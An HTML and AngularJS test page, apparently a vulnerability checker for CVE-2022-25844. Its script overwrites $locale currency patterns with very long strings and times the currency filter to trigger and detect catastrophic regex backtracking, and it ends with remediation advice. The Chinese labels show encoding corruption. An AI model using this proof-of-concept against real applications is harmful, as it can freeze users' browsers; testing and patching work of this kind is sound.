<!DOCTYPE html>
<html ng-app="testApp">
<head>
    <meta charset="UTF-8">
    <title>CVE-2022-25844 AngularJS $locale ReDoS æ¸¬è©¦é é¢</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        .container {
            background: #f5f5f5;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }
        .vulnerability-info {
            background: #ffebcd;
            border: 2px solid #daa520;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
        }
        .test-section {
            background: #e6f3ff;
            border: 1px solid #0066cc;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
        }
        .attack-button {
            background: #ff4444;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }
        .attack-button:hover {
            background: #cc0000;
        }
        .safe-button {
            background: #44aa44;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }
        .safe-button:hover {
            background: #006600;
        }
        .result {
            margin: 10px 0;
            padding: 10px;
            border-radius: 5px;
        }
        .timing {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
        }
        .vulnerable {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
        }
        .safe {
            background: #d4edda;
            border: 1px solid #c3e6cb;
        }
        .status {
            font-weight: bold;
            margin: 10px 0;
        }
        .code-block {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            padding: 10px;
            font-family: 'Courier New', monospace;
            border-radius: 3px;
            overflow-x: auto;
        }
        .warning {
            color: #856404;
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
    </style>
</head>
<body ng-controller="TestController">
    
    <h1>CVE-2022-25844 AngularJS $locale ReDoS å¼±é»æ¸¬è©¦</h1>
    
    <div class="vulnerability-info">
        <h3>âš ï¸ å¼±é»è³‡è¨Š</h3>
        <p><strong>CVE ID:</strong> CVE-2022-25844</p>
        <p><strong>CVSS è©•åˆ†:</strong> 7.5 (High)</p>
        <p><strong>å½±éŸ¿ç‰ˆæœ¬:</strong> AngularJS >= 1.7.0</p>
        <p><strong>å¼±é»é¡å‹:</strong> Regular Expression Denial of Service (ReDoS)</p>
        <p><strong>æ”»æ“Šå‘é‡:</strong> é€šéè¦†å¯« $locale.NUMBER_FORMATS.PATTERNS[1].posPre ç‚ºè¶…é•·å­—ä¸²ï¼Œåœ¨åŸ·è¡Œ currency éæ¿¾å™¨æ™‚è§¸ç™¼æ­£è¦è¡¨é”å¼ç½é›£æ€§å›æº¯</p>
    </div>
    
    <div class="container">
        <h3>ğŸ” ç•¶å‰ç’°å¢ƒè³‡è¨Š</h3>
        <div class="status">
            <p>AngularJS ç‰ˆæœ¬: <span class="code-block">{{angularVersion}}</span></p>
            <p>ç€è¦½å™¨: <span class="code-block">{{userAgent}}</span></p>
            <p>ç•¶å‰ $locale.id: <span class="code-block">{{currentLocale}}</span></p>
        </div>
    </div>
    
    <div class="test-section">
        <h3>ğŸ§ª åŸºæœ¬åŠŸèƒ½æ¸¬è©¦</h3>
        <p>æ­£å¸¸çš„ currency éæ¿¾å™¨æ¸¬è©¦ï¼š</p>
        <div class="result safe">
            <p>æ­£æ•¸: {{ 100 | currency : '$' }} (æ­£å¸¸æ ¼å¼åŒ–)</p>
            <p>è² æ•¸: {{ -100 | currency : '$' }} (ä½¿ç”¨ PATTERNS[1])</p>
            <p>ç©ºç¬¦è™Ÿ: {{ -100 | currency : '' }} (ç©ºå­—ä¸²ç¬¦è™Ÿï¼ŒCVE-2022-25844 è§¸ç™¼æ¢ä»¶)</p>
        </div>
    </div>
    
    <div class="test-section">
        <h3>ğŸ¯ CVE-2022-25844 æ”»æ“Šæ¸¬è©¦</h3>
        
        <div class="warning">
            <strong>è­¦å‘Š:</strong> ä»¥ä¸‹æ¸¬è©¦æœƒæ•…æ„è§¸ç™¼ ReDoS æ”»æ“Šï¼Œå¯èƒ½å°è‡´ç€è¦½å™¨æš«æ™‚ç„¡éŸ¿æ‡‰ã€‚è«‹åœ¨æ¸¬è©¦ç’°å¢ƒä¸­åŸ·è¡Œã€‚
        </div>
        
        <h4>æ¸¬è©¦ 1: ä¸­ç­‰å¼·åº¦ ReDoS (10,000 å­—ç¬¦)</h4>
        <button class="attack-button" ng-click="testReDoS(10000)" ng-disabled="testing">
            åŸ·è¡Œ 10K ReDoS æ¸¬è©¦
        </button>
        <div class="result timing" ng-if="results.test10k">
            <p>åŸ·è¡Œæ™‚é–“: <strong>{{results.test10k.duration}}ms</strong></p>
            <p>ç‹€æ…‹: <span ng-class="results.test10k.vulnerable ? 'vulnerable' : 'safe'">
                {{results.test10k.vulnerable ? 'âš ï¸ å¯èƒ½å­˜åœ¨å¼±é»' : 'âœ… æœªæª¢æ¸¬åˆ°ç•°å¸¸'}}
            </span></p>
            <p>çµæœ: {{results.test10k.result}}</p>
        </div>
        
        <h4>æ¸¬è©¦ 2: é«˜å¼·åº¦ ReDoS (50,000 å­—ç¬¦)</h4>
        <button class="attack-button" ng-click="testReDoS(50000)" ng-disabled="testing">
            åŸ·è¡Œ 50K ReDoS æ¸¬è©¦
        </button>
        <div class="result timing" ng-if="results.test50k">
            <p>åŸ·è¡Œæ™‚é–“: <strong>{{results.test50k.duration}}ms</strong></p>
            <p>ç‹€æ…‹: <span ng-class="results.test50k.vulnerable ? 'vulnerable' : 'safe'">
                {{results.test50k.vulnerable ? 'âš ï¸ å¯èƒ½å­˜åœ¨å¼±é»' : 'âœ… æœªæª¢æ¸¬åˆ°ç•°å¸¸'}}
            </span></p>
            <p>çµæœ: {{results.test50k.result}}</p>
        </div>
        
        <h4>æ¸¬è©¦ 3: æ¥µé™å¼·åº¦ ReDoS (100,000 å­—ç¬¦)</h4>
        <button class="attack-button" ng-click="testReDoS(100000)" ng-disabled="testing">
            åŸ·è¡Œ 100K ReDoS æ¸¬è©¦ (å±éšª)
        </button>
        <div class="result timing" ng-if="results.test100k">
            <p>åŸ·è¡Œæ™‚é–“: <strong>{{results.test100k.duration}}ms</strong></p>
            <p>ç‹€æ…‹: <span ng-class="results.test100k.vulnerable ? 'vulnerable' : 'safe'">
                {{results.test100k.vulnerable ? 'âš ï¸ å¯èƒ½å­˜åœ¨å¼±é»' : 'âœ… æœªæª¢æ¸¬åˆ°ç•°å¸¸'}}
            </span></p>
            <p>çµæœ: {{results.test100k.result}}</p>
        </div>
        
        <div class="result" ng-if="testing">
            <p>ğŸ”„ æ¸¬è©¦é€²è¡Œä¸­ï¼Œè«‹ç¨å€™...</p>
            <p>â±ï¸ å·²åŸ·è¡Œæ™‚é–“: {{testingTime}}ms</p>
        </div>
    </div>
    
    <div class="test-section">
        <h3>ğŸ”§ æ‰‹å‹•æ¸¬è©¦å€åŸŸ</h3>
        <p>è‡ªè¨‚ posPre é•·åº¦æ¸¬è©¦ï¼š</p>
        <label>posPre å­—ç¬¦æ•¸: </label>
        <input type="number" ng-model="customLength" min="1000" max="200000" value="20000">
        <br><br>
        <label>æ¸¬è©¦æ•¸å€¼: </label>
        <input type="number" ng-model="customValue" value="-100">
        <br><br>
        <button class="attack-button" ng-click="testCustomReDoS()" ng-disabled="testing">
            åŸ·è¡Œè‡ªè¨‚ ReDoS æ¸¬è©¦
        </button>
        <div class="result timing" ng-if="results.custom">
            <p>posPre é•·åº¦: {{results.custom.length}} å­—ç¬¦</p>
            <p>åŸ·è¡Œæ™‚é–“: <strong>{{results.custom.duration}}ms</strong></p>
            <p>ç‹€æ…‹: <span ng-class="results.custom.vulnerable ? 'vulnerable' : 'safe'">
                {{results.custom.vulnerable ? 'âš ï¸ æª¢æ¸¬åˆ° ReDoS' : 'âœ… æœªæª¢æ¸¬åˆ°ç•°å¸¸'}}
            </span></p>
            <p>çµæœ: {{results.custom.result}}</p>
        </div>
    </div>
    
    <div class="test-section">
        <h3>ğŸ“Š $locale ç‹€æ…‹æª¢æŸ¥</h3>
        <button class="safe-button" ng-click="checkLocaleStatus()">æª¢æŸ¥ç•¶å‰ $locale ç‹€æ…‹</button>
        <div class="result" ng-if="localeStatus">
            <h4>$locale.NUMBER_FORMATS å…§å®¹:</h4>
            <div class="code-block">
                <pre>{{localeStatus | json}}</pre>
            </div>
        </div>
        
        <button class="attack-button" ng-click="injectMaliciousLocale()">
            æ³¨å…¥æƒ¡æ„ $locale è¨­å®š
        </button>
        <div class="result" ng-if="localeInjected">
            <p ng-if="localeInjected.success" class="vulnerable">
                âœ… æˆåŠŸæ³¨å…¥æƒ¡æ„ $locale è¨­å®šï¼PATTERNS[1].posPre å·²è¢«è¦†å¯«ç‚º {{localeInjected.length}} å­—ç¬¦
            </p>
            <p ng-if="!localeInjected.success" class="safe">
                âŒ $locale æ³¨å…¥å¤±æ•—æˆ–è¢«ä¿è­·
            </p>
        </div>
    </div>
    
    <div class="test-section">
        <h3>ğŸ”¬ å³æ™‚ currency éæ¿¾å™¨æ¸¬è©¦</h3>
        <p>ç•¶å‰è¢«æ±¡æŸ“çš„ $locale å³æ™‚æ¸¬è©¦:</p>
        <div class="result" ng-if="localeInjected && localeInjected.success">
            <p>âš ï¸ è­¦å‘Š: $locale å·²è¢«æ±¡æŸ“ï¼Œä»¥ä¸‹æ¸¬è©¦å¯èƒ½å°è‡´ç€è¦½å™¨å¡æ­»</p>
            <button class="attack-button" ng-click="testPollutedCurrency()">
                æ¸¬è©¦è¢«æ±¡æŸ“çš„ currency éæ¿¾å™¨
            </button>
            <div ng-if="pollutedResult">
                <p>åŸ·è¡Œæ™‚é–“: <strong>{{pollutedResult.duration}}ms</strong></p>
                <p>çµæœ: {{pollutedResult.result}}</p>
                <p ng-if="pollutedResult.vulnerable" class="vulnerable">
                    ğŸš¨ ç¢ºèªå­˜åœ¨ CVE-2022-25844 ReDoS å¼±é»ï¼
                </p>
            </div>
        </div>
    </div>
    
    <div class="container">
        <h3>ğŸ“‹ æ¸¬è©¦ç¸½çµ</h3>
        <div class="result" ng-if="summary">
            <h4>å¼±é»æª¢æ¸¬æ‘˜è¦:</h4>
            <ul>
                <li>ç¸½æ¸¬è©¦æ¬¡æ•¸: {{summary.totalTests}}</li>
                <li>ç™¼ç¾å¼±é»: {{summary.vulnerableTests}}</li>
                <li>æœ€é•·åŸ·è¡Œæ™‚é–“: {{summary.maxDuration}}ms</li>
                <li>å¹³å‡åŸ·è¡Œæ™‚é–“: {{summary.avgDuration}}ms</li>
                <li ng-if="summary.vulnerable" class="vulnerable">
                    ğŸš¨ <strong>çµè«–: ç¢ºèªå­˜åœ¨ CVE-2022-25844 å¼±é»</strong>
                </li>
                <li ng-if="!summary.vulnerable" class="safe">
                    âœ… <strong>çµè«–: æœªæª¢æ¸¬åˆ°æ˜ç¢ºçš„ ReDoS å¼±é»</strong>
                </li>
            </ul>
        </div>
        
        <button class="safe-button" ng-click="generateReport()">
            ç”Ÿæˆè©³ç´°å ±å‘Š
        </button>
        
        <div class="result" ng-if="detailedReport">
            <h4>è©³ç´°å ±å‘Š:</h4>
            <div class="code-block">
                <pre>{{detailedReport}}</pre>
            </div>
        </div>
    </div>
    
    <div class="vulnerability-info">
        <h3>ğŸ›¡ï¸ ä¿®å¾©å»ºè­°</h3>
        <ol>
            <li><strong>ç«‹å³æ›´æ–°:</strong> å‡ç´šåˆ° AngularJS NES 1.8.8+ æˆ–é·ç§»åˆ°ç¾ä»£æ¡†æ¶</li>
            <li><strong>è¼¸å…¥é©—è­‰:</strong> é™åˆ¶ $locale è¨­å®šçš„ä½¿ç”¨è€…æ§åˆ¶æ€§</li>
            <li><strong>é•·åº¦é™åˆ¶:</strong> å° NUMBER_FORMATS.PATTERNS çš„å­—ä¸²é•·åº¦å¯¦æ–½é™åˆ¶</li>
            <li><strong>ç›£æ§é˜²è­·:</strong> å¯¦æ–½å‰ç«¯æ•ˆèƒ½ç›£æ§ï¼Œæª¢æ¸¬ç•°å¸¸çš„ CPU ä½¿ç”¨</li>
            <li><strong>CSP æ”¿ç­–:</strong> å¯¦æ–½åš´æ ¼çš„å…§å®¹å®‰å…¨æ”¿ç­–é˜²æ­¢æƒ¡æ„è…³æœ¬æ³¨å…¥</li>
        </ol>
    </div>

    <script>
        angular.module('testApp', [])
        .controller('TestController', ['$scope', '$locale', '$filter', '$timeout', function($scope, $locale, $filter, $timeout) {
            // åˆå§‹åŒ–
            $scope.angularVersion = angular.version.full;
            $scope.userAgent = navigator.userAgent;
            $scope.currentLocale = $locale.id;
            $scope.results = {};
            $scope.testing = false;
            $scope.testingTime = 0;
            $scope.customLength = 20000;
            $scope.customValue = -100;
            
            var originalLocale = angular.copy($locale.NUMBER_FORMATS);
            var testResults = [];
            
            // ReDoS æ¸¬è©¦å‡½æ•¸
            $scope.testReDoS = function(length) {
                var testName = 'test' + (length / 1000) + 'k';
                $scope.testing = true;
                $scope.testingTime = 0;
                
                // é–‹å§‹è¨ˆæ™‚å™¨
                var startTime = Date.now();
                var timer = setInterval(function() {
                    $scope.testingTime = Date.now() - startTime;
                    $scope.$apply();
                }, 100);
                
                // ä½¿ç”¨ $timeout é¿å…é˜»å¡ UI
                $timeout(function() {
                    try {
                        // 1. å‚™ä»½åŸå§‹ locale
                        var backup = angular.copy($locale.NUMBER_FORMATS);
                        
                        // 2. æ³¨å…¥æƒ¡æ„ posPre
                        var maliciousPosPre = ' '.repeat(length);
                        $locale.NUMBER_FORMATS.PATTERNS[1].posPre = maliciousPosPre;
                        
                        // 3. æ¸¬è©¦ currency éæ¿¾å™¨ (è§¸ç™¼ ReDoS)
                        var testStart = performance.now();
                        var result = $filter('currency')(-100, ''); // è² æ•¸ + ç©ºç¬¦è™Ÿè§¸ç™¼ PATTERNS[1]
                        var testEnd = performance.now();
                        
                        var duration = Math.round(testEnd - testStart);
                        var isVulnerable = duration > 1000; // è¶…é 1 ç§’èªç‚ºå¯èƒ½å­˜åœ¨ ReDoS
                        
                        $scope.results[testName] = {
                            duration: duration,
                            vulnerable: isVulnerable,
                            result: result,
                            length: length
                        };
                        
                        // è¨˜éŒ„æ¸¬è©¦çµæœ
                        testResults.push({
                            name: testName,
                            length: length,
                            duration: duration,
                            vulnerable: isVulnerable
                        });
                        
                        // 4. æ¢å¾©åŸå§‹ locale
                        $locale.NUMBER_FORMATS = backup;
                        
                    } catch (error) {
                        $scope.results[testName] = {
                            duration: 'ERROR',
                            vulnerable: true,
                            result: 'Test failed: ' + error.message,
                            length: length
                        };
                    } finally {
                        clearInterval(timer);
                        $scope.testing = false;
                        $scope.updateSummary();
                    }
                }, 50);
            };
            
            // è‡ªè¨‚ ReDoS æ¸¬è©¦
            $scope.testCustomReDoS = function() {
                var length = parseInt($scope.customLength) || 20000;
                var value = parseInt($scope.customValue) || -100;
                
                $scope.testing = true;
                
                $timeout(function() {
                    try {
                        var backup = angular.copy($locale.NUMBER_FORMATS);
                        var maliciousPosPre = ' '.repeat(length);
                        $locale.NUMBER_FORMATS.PATTERNS[1].posPre = maliciousPosPre;
                        
                        var testStart = performance.now();
                        var result = $filter('currency')(value, '');
                        var testEnd = performance.now();
                        
                        var duration = Math.round(testEnd - testStart);
                        var isVulnerable = duration > 500;
                        
                        $scope.results.custom = {
                            duration: duration,
                            vulnerable: isVulnerable,
                            result: result,
                            length: length
                        };
                        
                        testResults.push({
                            name: 'custom',
                            length: length,
                            duration: duration,
                            vulnerable: isVulnerable
                        });
                        
                        $locale.NUMBER_FORMATS = backup;
                        
                    } catch (error) {
                        $scope.results.custom = {
                            duration: 'ERROR',
                            vulnerable: true,
                            result: 'Test failed: ' + error.message,
                            length: length
                        };
                    } finally {
                        $scope.testing = false;
                        $scope.updateSummary();
                    }
                }, 50);
            };
            
            // æª¢æŸ¥ $locale ç‹€æ…‹
            $scope.checkLocaleStatus = function() {
                $scope.localeStatus = {
                    CURRENCY_SYM: $locale.NUMBER_FORMATS.CURRENCY_SYM,
                    DECIMAL_SEP: $locale.NUMBER_FORMATS.DECIMAL_SEP,
                    GROUP_SEP: $locale.NUMBER_FORMATS.GROUP_SEP,
                    PATTERNS: $locale.NUMBER_FORMATS.PATTERNS
                };
            };
            
            // æ³¨å…¥æƒ¡æ„ $locale è¨­å®š
            $scope.injectMaliciousLocale = function() {
                try {
                    var maliciousLength = 50000;
                    var maliciousPosPre = ' '.repeat(maliciousLength);
                    
                    // å˜—è©¦è¦†å¯« $locale
                    $locale.NUMBER_FORMATS.PATTERNS[1].posPre = maliciousPosPre;
                    
                    // é©—è­‰æ˜¯å¦æˆåŠŸ
                    var currentPosPre = $locale.NUMBER_FORMATS.PATTERNS[1].posPre;
                    var success = currentPosPre.length === maliciousLength;
                    
                    $scope.localeInjected = {
                        success: success,
                        length: currentPosPre.length
                    };
                    
                } catch (error) {
                    $scope.localeInjected = {
                        success: false,
                        error: error.message
                    };
                }
            };
            
            // æ¸¬è©¦è¢«æ±¡æŸ“çš„ currency éæ¿¾å™¨
            $scope.testPollutedCurrency = function() {
                try {
                    var testStart = performance.now();
                    var result = $filter('currency')(-100, '');
                    var testEnd = performance.now();
                    
                    var duration = Math.round(testEnd - testStart);
                    
                    $scope.pollutedResult = {
                        duration: duration,
                        result: result,
                        vulnerable: duration > 1000
                    };
                    
                } catch (error) {
                    $scope.pollutedResult = {
                        duration: 'ERROR',
                        result: 'Test failed: ' + error.message,
                        vulnerable: true
                    };
                }
            };
            
            // æ›´æ–°æ¸¬è©¦ç¸½çµ
            $scope.updateSummary = function() {
                if (testResults.length === 0) return;
                
                var totalTests = testResults.length;
                var vulnerableTests = testResults.filter(r => r.vulnerable).length;
                var durations = testResults.map(r => r.duration).filter(d => typeof d === 'number');
                var maxDuration = Math.max(...durations);
                var avgDuration = Math.round(durations.reduce((a, b) => a + b, 0) / durations.length);
                
                $scope.summary = {
                    totalTests: totalTests,
                    vulnerableTests: vulnerableTests,
                    maxDuration: maxDuration,
                    avgDuration: avgDuration,
                    vulnerable: vulnerableTests > 0
                };
            };
            
            // ç”Ÿæˆè©³ç´°å ±å‘Š
            $scope.generateReport = function() {
                var report = {
                    timestamp: new Date().toISOString(),
                    environment: {
                        angularVersion: $scope.angularVersion,
                        userAgent: $scope.userAgent,
                        locale: $scope.currentLocale
                    },
                    vulnerability: 'CVE-2022-25844',
                    description: 'AngularJS $locale NUMBER_FORMATS ReDoS',
                    testResults: testResults,
                    summary: $scope.summary,
                    recommendation: $scope.summary && $scope.summary.vulnerable ? 
                        'VULNERABLE: Update to AngularJS NES 1.8.8+ immediately' :
                        'No clear ReDoS vulnerability detected, but recommend updating for security'
                };
                
                $scope.detailedReport = JSON.stringify(report, null, 2);
            };
            
            // åˆå§‹æª¢æŸ¥
            $scope.checkLocaleStatus();
        }]);
    </script>
</body>
</html>